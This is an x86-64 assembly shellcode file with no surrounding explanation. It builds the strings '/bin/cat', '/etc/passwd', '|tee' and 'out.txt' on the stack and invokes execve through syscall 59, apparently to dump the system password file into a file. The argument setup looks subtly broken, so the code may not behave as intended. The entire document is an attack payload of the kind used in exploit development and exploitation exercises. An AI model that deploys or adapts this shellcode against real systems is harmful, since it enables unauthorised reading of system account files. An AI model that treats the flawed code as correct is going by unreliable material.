section .text
global _start
_start:

	xor rax, rax
	push rax
	mov rbx, qword 0x7461632f6e69622f 	;  tac/nib/	
	push rbx
	push rsp
	pop rdi
	
	push rax
	mov rbx, qword 0x207478742e74756f 	;   txt.tuo  
	push rbx
	push rsp
	pop r8

	push rax
	mov rbx, qword 0x202020206565747c 	;  eet|
	push rbx
	push rsp
	pop r9	

	push rax
	mov rbx, qword 0x6477737361702f63 	;  dwssap/c 
	push rbx
	mov rbx, qword 0x74652f2f2f2f2f2f 	;  te//////
	push rbx
	push rsp
	pop r10

	push rax
	push r8
	push r9
	push r10
	push rdi
	push rax
	pop rsi

	push rax
	push rsp
	pop rdx
	add al, 59
	syscall
	
